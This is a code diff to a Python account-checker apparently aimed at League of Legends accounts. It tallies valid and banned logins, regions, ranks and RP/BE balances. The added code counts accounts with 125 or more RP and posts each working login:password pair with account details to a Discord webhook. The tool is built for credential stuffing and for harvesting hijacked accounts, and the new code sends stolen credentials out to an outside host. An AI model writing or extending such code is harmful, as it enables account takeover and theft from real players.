@@ -3,12 +3,14 @@ import traceback
 import os
 import ctypes
 from colorama import Fore,Style
+import discord_webhook
 import datetime
 check=checkers.checkers()
 sys=systems.system()
 
 class Checker:
-    def __init__(self) -> None:
+    def __init__(self,settings:list) -> None:
+        self.webhook=settings['webhook']
         self.err=0
         self.count=0
         self.valid=0
@@ -27,6 +29,8 @@ class Checker:
             "TR": 0,
             'unknown':0
         }
+
+        self.rpgift=0
 
         self.ranks={
             'unranked':0,
@@ -54,6 +58,8 @@ class Checker:
     >                   checked              >[{Fore.YELLOW}{self.checked}/{count}{Style.RESET_ALL}]<
     >                   valid                >[{Fore.GREEN}{self.valid}{Style.RESET_ALL}]<
     >                   banned               >[{Fore.LIGHTRED_EX}{self.banned}{Style.RESET_ALL}]<
+    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    >                   125+ rp              >[{Fore.GREEN}{self.rpgift}{Style.RESET_ALL}]<
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     >                   BR                   >[{Fore.CYAN}{self.regions['BR']}{Style.RESET_ALL}]<
     >                   EUN                  >[{Fore.CYAN}{self.regions['EUN']}{Style.RESET_ALL}]<
@@ -108,6 +114,9 @@ class Checker:
                     rp,be=check.balance(token,regionid)
                 else:
                     rp,be='N/A','N/A'
+                if rp != 'N/A':
+                    if int(rp)>=125:
+                        self.rpgift+=1
 
                 self.valid+=1
                 with open (f'output\\valid.txt', 'a', encoding='UTF-8') as file:
@@ -121,6 +130,19 @@ class Checker:
 
                 #inventory=check.get_inventory(self.user_info,self.region_id,login,token)
                 #print(inventory)
+                if region!='N/A' and self.webhook!='':
+                    from discord_webhook import DiscordWebhook, DiscordEmbed
+                    dcwebhook = DiscordWebhook(url=self.webhook)
+                    embed = DiscordEmbed(title='New valid account', color='34eb43')
+                    embed.set_author(name='lolkeker')
+                    embed.set_timestamp()
+                    embed.add_embed_field(name='LogPass', value=account)
+                    embed.add_embed_field(name='Region', value=region)
+                    embed.add_embed_field(name='Rank', value=rank)
+                    embed.add_embed_field(name='Level', value=level)
+                    embed.add_embed_field(name=f'RP / BE', value=f'{rp} / {be}')
+                    dcwebhook.add_embed(embed)
+                    response=dcwebhook.execute()
             except Exception as e:
                 with open('log.txt','a') as f:
                     f.write(f'({datetime.datetime.now()}) {str(traceback.format_exc())}\n_________________________________\n')
